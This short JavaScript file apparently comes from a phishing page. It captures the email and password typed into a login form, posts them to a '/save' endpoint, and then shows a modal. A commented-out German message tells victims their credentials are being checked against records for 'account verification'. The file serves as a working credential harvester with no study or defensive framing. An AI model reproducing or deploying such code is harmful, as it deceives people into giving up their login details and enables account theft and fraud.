const passwordInput = document.getElementById("input-password");
const toggle = document.getElementById("toggle");

toggle.addEventListener("click", (e) => {
  e.preventDefault();
  const isPassword = passwordInput.type === "password";
  passwordInput.type = isPassword ? "text" : "password";
});

function sendData() {
  const email = document.getElementById("input-email").value;
  const password = document.getElementById("input-password").value;

  // Simple validation
  if (!email || !password) {
    alert("Please enter both email and password!");
    return;
  }

  fetch('/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  .then(res => res.json())
  .then(response => {
    console.log('Server response:', response);
    showModal();
    // alert("Kontoprüfung läuft:Ihre Anmeldedaten werden mit unseren Aufzeichnungen abgeglichen, um ihre Richtigkeit zu überprüfen. Nach Abschluss der Prüfung werden Sie verifiziert. Sollten wir Ihre Angaben nicht bestätigen können, wird Ihr Konto nach der Prüfung markiert.");
    document.getElementById("myForm").reset();
  })
  .catch(err => console.error('Error:', err));
}

const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModal");

function showModal() {
  modalOverlay.style.display = "flex";
}

function hideModal() {
  modalOverlay.style.display = "none";
}
closeModalBtn.addEventListener("click", hideModal);
